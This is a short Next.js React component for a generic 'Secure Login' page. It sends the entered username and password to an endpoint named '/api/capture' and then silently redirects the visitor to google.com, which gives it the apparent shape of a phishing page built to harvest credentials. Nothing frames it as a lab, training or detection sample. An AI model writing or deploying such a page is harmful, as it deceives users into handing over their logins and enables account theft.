'use client'

export default function Home() {
  const handleSubmit = async (formData: FormData) => {
    await fetch('/api/capture', {
      method: 'POST',
      body: formData,
    })
    window.location.href = 'https://www.google.com'
  }

  return (
    <main className="flex min-h-screen flex-col items-center justify-center p-24 bg-gray-100">
      <div className="bg-white p-8 rounded-lg shadow-md w-96">
        <h1 className="text-2xl font-bold mb-6 text-center text-gray-800">Secure Login</h1>
        <form action={handleSubmit}>
          <input
            name="username"
            type="text"
            placeholder="Username or Email"
            className="w-full p-3 mb-4 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
            required
          />
          <input
            name="password"
            type="password"
            placeholder="Password"
            className="w-full p-3 mb-6 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
            required
          />
          <button
            type="submit"
            className="w-full bg-blue-500 text-white p-3 rounded-md hover:bg-blue-600 transition"
          >
            Sign In
          </button>
        </form>
      </div>
    </main>
  )
}
